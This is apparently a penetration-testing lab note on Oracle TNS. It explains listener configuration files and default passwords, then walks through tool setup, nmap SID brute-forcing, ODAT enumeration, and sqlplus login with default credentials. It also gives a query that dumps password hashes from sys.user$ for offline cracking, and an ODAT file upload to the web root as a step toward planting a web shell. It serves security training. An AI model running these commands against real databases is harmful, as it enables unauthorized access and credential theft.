# Oracle TNS

The `Oracle Transparent Network Substrate` (`TNS`)
 server is a communication protocol that facilitates communication 
between Oracle databases and applications over networks. Initially 
introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP`
 protocol stacks. As a result, it has become a preferred solution for 
managing large, complex databases in the healthcare, finance, and retail
 industries. In addition, its built-in encryption mechanism ensures the 
security of data transmitted, making it an ideal solution for enterprise
 environments where data security is paramount.

Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:

| Name resolution | Connection management | Load balancing | Security |
| --- | --- | --- | --- |

Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.

## **Default Configuration**

The default configuration of the Oracle TNS server varies depending on 
the version and edition of Oracle software installed. However, some 
common settings are usually configured by default in Oracle TNS. By 
default, the listener listens for incoming connections on the `TCP/1521`
 port. However, this default port can be changed during installation or 
later in the configuration file. The TNS listener is configured to 
support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`.
 The listener can also support multiple network interfaces and listen on
 specific IP addresses or all available network interfaces. By default, 
Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.

The default configuration of the TNS listener also includes a few basic 
security features. For example, the listener will only accept 
connections from authorized hosts and perform basic authentication using
 a combination of hostnames, IP addresses, and usernames and passwords. 
Additionally, the listener will use Oracle Net Services to encrypt the 
communication between the client and the server. The configuration files
 for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin`
 directory. The plain text file contains configuration information for 
Oracle database instances and other network services that use the TNS 
protocol.

Oracle TNS is often used with other Oracle services like Oracle DBSNMP, 
Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, 
Oracle Fusion Middleware, web servers, and many more. There have been 
made many changes for the default installation of Oracle services. For 
example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger`
 service together with Oracle, which can put Oracle's service at risk 
and make it vulnerable when we have the required knowledge of a home 
directory.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007)
 file, containing the necessary information for clients to connect to 
the service. The entry consists of a name for the service, the network 
location of the service, and the database or service name that clients 
should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:

### **Tnsnames.ora**

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

On the other hand, the `listener.ora` file is a server-side 
configuration file that defines the listener process's properties and 
parameters, which is responsible for receiving incoming client requests 
and forwarding them to the appropriate Oracle database instance.

### Listener.ora

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle

```

In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.

### PlsqlExclusionList

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper`
 directory, and it contains the names of PL/SQL packages or types that 
should be excluded from execution. Once the PL/SQL Exclusion List file 
is created, it can be loaded into the database instance. It serves as a 
blacklist that cannot be accessed through the Oracle Application Server.

| **Setting** | **Description** |
| --- | --- |
| `DESCRIPTION` | A descriptor that provides a name for the database and its connection type. |
| `ADDRESS` | The network address of the database, which includes the hostname and port number. |
| `PROTOCOL` | The network protocol used for communication with the server |
| `PORT` | The port number used for communication with the server |
| `CONNECT_DATA` | Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier. |
| `INSTANCE_NAME` | The name of the database instance the client wants to connect. |
| `SERVICE_NAME` | The name of the service that the client wants to connect to. |
| `SERVER` | The type of server used for the database connection, such as dedicated or shared. |
| `USER` | The username used to authenticate with the database server. |
| `PASSWORD` | The password used to authenticate with the database server. |
| `SECURITY` | The type of security for the connection. |
| `VALIDATE_CERT` | Whether to validate the certificate using SSL/TLS. |
| `SSL_VERSION` | The version of SSL/TLS to use for the connection. |
| `CONNECT_TIMEOUT` | The time limit in seconds for the client to establish a connection to the database. |
| `RECEIVE_TIMEOUT` | The time limit in seconds for the client to receive a response from the database. |
| `SEND_TIMEOUT` | The time limit in seconds for the client to send a request to the database. |
| `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed. |
| `TRACE_LEVEL` | The level of tracing for the database connection. |
| `TRACE_DIRECTORY` | The directory where the trace files are stored. |
| `TRACE_FILE_NAME` | The name of the trace file. |
| `LOG_FILE` | The file where the log information is stored. |

## Footprinting the service

### **Oracle-Tools-setup.sh**

few packages to enumerate Oracle TNS

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### **Testing ODAT**

Oracle Database Attacking Tool (`ODAT`) is an open-source 
penetration testing tool written in Python and designed to enumerate and
 exploit vulnerabilities in Oracle databases. It can be used to identify
 and exploit various security flaws in Oracle databases, including SQL 
injection, remote code execution, and privilege escalation.

```bash
./odat.py -h
```

### nmap

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

### SID

In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a 
set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection 
string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection 
attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.

There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others.

### **Nmap - SID Bruteforcing**

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

### **ODAT**

```bash
./odat.py all -s 10.129.204.235
```

### **SQLplus - Log In**

```bash
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

### sqlplus after login

```bash
select table_name from all_tables;
select * from user_role_privs;
```

### Password hashes

we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

```bash
 select name, password from sys.user$;
```

### Upload a webshell

Another option is to upload a web shell to the target. However, this 
requires the server to run a web server, and we need to know the exact 
location of the root directory for the webserver. Nevertheless, if we 
know what type of system we are dealing with, we can try the default 
paths, which are:

| **OS** | **Path** |
| --- | --- |
| Linux | `/var/www/html` |
| Windows | `C:\inetpub\wwwroot` |

First, trying our exploitation approach with files that do not look 
dangerous for Antivirus or Intrusion detection/prevention systems is 
always important. Therefore, we create a text file with a string and use
 it to upload to the target system.

### **Oracle RDBMS - File Upload**

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

#Testing
curl -X GET http://10.129.204.235/testing.txt

```